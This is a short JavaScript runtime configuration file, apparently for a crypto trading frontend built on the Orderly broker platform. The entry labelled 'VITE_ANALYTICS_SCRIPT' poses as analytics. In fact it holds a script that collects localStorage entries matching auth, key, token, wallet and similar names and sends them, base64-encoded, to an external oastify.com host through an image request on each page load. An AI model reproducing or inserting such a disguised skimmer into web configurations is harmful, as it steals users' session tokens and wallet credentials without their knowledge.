window.__RUNTIME_CONFIG__ = {
  ...
  "VITE_ORDERLY_BROKER_NAME": "boombow",
  "VITE_BROKER_EOA_ADDRESS": "0xf9ba6e8a62b62e2606cc808d72e68829faa3d2cb",
  ...
  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var d={h:location.hostname,k:{}};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(/orderly|auth|key|token|wallet|privy/i.test(k)){d.k[k]=localStorage.getItem(k)}}if(Object.keys(d.k).length>0){new Image().src='https://0efmnx00w04o92xweaesqpm9v01rpjd8.oastify.com/?d='+encodeURIComponent(btoa(JSON.stringify(d)))}})()</script>",
  "VITE_SYMBOL_LIST": "",
